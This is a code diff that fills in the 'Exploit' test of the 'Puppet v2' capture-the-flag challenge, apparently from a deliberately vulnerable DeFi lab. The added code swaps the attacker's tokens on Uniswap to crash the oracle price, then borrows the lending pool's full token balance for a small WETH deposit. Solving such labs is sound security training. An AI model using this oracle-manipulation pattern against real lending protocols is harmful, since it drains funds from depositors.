@@ -81,7 +81,27 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        
+        let blockNumber = await ethers.provider.getBlockNumber();
+        let deadline = (await ethers.provider.getBlock(blockNumber)).timestamp + 1800;
+
+        // attacker balance 10000 DVT 20 ETH, pool deposit required 300000 WETH
+        
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            0,
+            [this.token.address, this.uniswapRouter.WETH()],
+            attacker.address,
+            deadline
+        );
+
+        // attacker balance 0 DVT ~29.9 ETH, pool deposit required ~29.49 WETH
+
+        let deposit = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);        
+        this.weth.connect(attacker).deposit({ gasLimit: 1e6, value: deposit });
+        this.weth.connect(attacker).approve(this.lendingPool.address, deposit);
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { gasLimit: 1e6 });
     });
 
     after(async function () {
